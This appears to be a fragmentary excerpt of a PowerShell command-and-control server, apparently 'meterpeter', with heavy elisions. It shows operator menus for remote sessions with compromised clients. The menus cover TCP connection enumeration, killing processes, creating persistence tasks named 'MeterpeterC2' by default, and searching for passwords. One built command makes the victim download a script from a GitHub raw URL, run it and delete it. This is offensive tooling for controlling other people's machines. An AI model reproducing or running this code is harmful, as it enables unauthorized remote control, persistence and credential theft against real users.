...
#   PS cmdlet sub version: v2.10.13.1
...
While($Client.Connected)
{
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "Session")
    {
      ...
      write-host "    Remark: This function displays attacker (server) connection." -ForegroundColor DarkYellow
    ...
    If($Command -ieq "NetScanner")
    {
      ...
      If($choise -ieq "TCPinfo" -or $choise -ieq "conn")
      {
         ...
         {
            write-host " * Enumerating TCP statatistiscs." -ForegroundColor Green;Start-Sleep -Seconds 1
         ...
         {
            write-host " * Enumerating established TCP connections." -ForegroundColor Green;Start-Sleep -Seconds 1
         ...
         {
            write-host " * Enumerating established TCP\UDP connections." -ForegroundColor Green;Start-Sleep -Seconds 1
    ...
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ...
      If($choise -ieq "Processes" -or $choise -ieq "proc")
      {
         ...
         If($wifi_choise -ieq "kill")
         {
            ...
            If(-not($KillChoise) -or $KillChoise -iMatch '(N|n|ProcessName)')
            {
               Write-Host " - The process name to kill     : " -NoNewline -ForeGroundColor Red
               $Proc_name = Read-Host
               If(-not ($proc_name) -or $Proc_name -ieq " ")
               {
                  write-host "`n`n   Error: We need to provide a process name ..`n" -ForegroundColor Red
               ...
               Else
               {
                  ...
                  $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/killProcess.ps1`" -OutFile `"`$Env:TMP\killProcess.ps1`"|Unblock-File;powershell -file `"`$Env:TMP\killProcess.ps1`" -Proc_name $Proc_name -ppid false;Remove-Item -Path `"`$Env:TMP\killProcess.ps1`" -Force"
               }
            }
            Else
            {
               Write-Host " - PID of the process to kill   : " -NoNewline -ForeGroundColor Red
               $Proc_name = Read-Host
               If(-not ($proc_name) -or $Proc_name -ieq " ")
               {
                  write-host "`n`n   Error: We need to provide a process PID ..`n" -ForegroundColor Red
                  $Command = $Null;
                  $Proc_name = $Null;
               }
               Else
      ...
      If($choise -ieq "tasks")
      {
         ...
         {
            write-Host " - Input Task Name to create   : " -NoNewline;
            $TaskName = Read-Host;
            If(-not($TaskName))
            {
               $TaskName = "MeterpeterC2"
...
"@;Write-Host $AnwsomeBanner
      ...
      If($choise -ieq "Passwords" -or $choise -ieq "pass")
      {
        ...
        write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                     ------------------";
        write-host "   Auto      Auto search recursive           UserLand";
        write-host "   Manual    Input String to Search          UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
